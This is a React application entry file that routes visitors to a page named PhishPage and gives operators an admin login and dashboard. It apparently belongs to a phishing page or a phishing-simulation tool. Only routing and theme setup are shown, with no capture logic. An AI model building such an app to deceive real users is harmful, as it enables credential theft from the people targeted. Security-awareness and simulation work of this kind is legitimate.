import React, { Component } from 'react';
import { BrowserRouter as Router, Switch, Route, Redirect } from 'react-router-dom';
import {
	ThemeProvider,
	createMuiTheme as createTheme
} from '@material-ui/core';
import AuthRoute from './utils/AuthRoute';
import axios from 'axios';

import Particles from 'particles-bg';

import PhishPage from './pages/PhishPage';
import AdminLogin from './pages/AdminLogin';
import AdminDash from './pages/AdminDash';

import { Provider } from 'react-redux';
import { SET_AUTHENTICATED } from './redux/types';
import store from './redux/store';

import customTheme from './theme';
import './App.css';

const theme = createTheme(customTheme);

const key = localStorage.getItem('key');

if (key) {
	store.dispatch({ type: SET_AUTHENTICATED });
	axios.defaults.headers.common['Authorization'] = key;
}

class App extends Component {
	render() {
		return (
			<Provider store={store}>
				<ThemeProvider theme={theme}>
					<Router>
						<Particles type='cobweb' num={200} color="#ffffff" bg={true} />
						<div className='container'>
							<Switch>
								<AuthRoute exact path='/' component={PhishPage} allowed={false} />
								<AuthRoute path="/login" component={AdminLogin} allowed={false} />
								<AuthRoute path='/admin' component={AdminDash} allowed={true} />
								{/* redirect if route not found */}
								<Route path="/" component={Redirect} to="/" />
							</Switch>
						</div>
					</Router>
				</ThemeProvider>
			</Provider>
		);
	}
}

export default App;
